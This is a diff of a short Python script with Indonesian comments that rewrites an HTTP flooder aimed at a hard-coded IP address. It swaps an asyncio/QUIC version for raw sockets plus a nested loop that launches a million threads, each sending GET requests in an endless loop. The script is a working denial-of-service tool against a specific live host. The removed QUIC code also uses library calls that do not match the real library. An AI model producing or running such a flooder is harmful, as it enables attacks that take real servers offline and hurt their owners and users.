@@ -1,31 +1,29 @@
-import asyncio
-import aioquic
+import socket
+import threading
 
 # Konfigurasi target
-target_url = "http://138.201.139.144/"
+target_ip = "138.201.139.144"
+target_port = 80
 
 # Fungsi untuk mengirim request
-async def send_request():
+def send_request():
     while True:
         try:
-            # Buat koneksi QUIC
-            quic = aioquic.QuicConnection()
-            await quic.connect(target_url)
-            # Kirim request
-            stream_id = quic.create_stream()
-            await quic.send_request(stream_id, b"GET / HTTP/1.1\r\nHost: 138.201.139.144\r\n\r\n")
-            # Baca response
-            response = await quic.recv()
-            print(f"Response: {response}")
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.sendto(b"GET / HTTP/1.1\r\nHost: 138.201.139.144\r\n\r\n", (target_ip, target_port))
+            s.close()
         except Exception as e:
             print(f"Error: {e}")
 
-# Buat loop asyncio
-async def main():
-    tasks = []
-    for i in range(1000):
-        task = asyncio.create_task(send_request())
-        tasks.append(task)
-    await asyncio.gather(*tasks)
+# Buat 1000 thread untuk mengirim request
+threads = []
+for i in range(1000):
+    for j in range(1000):
+        t = threading.Thread(target=send_request)
+        threads.append(t)
+        t.start()
 
-asyncio.run(main())
+# Tunggu semua thread selesai
+for t in threads:
+    t.join()
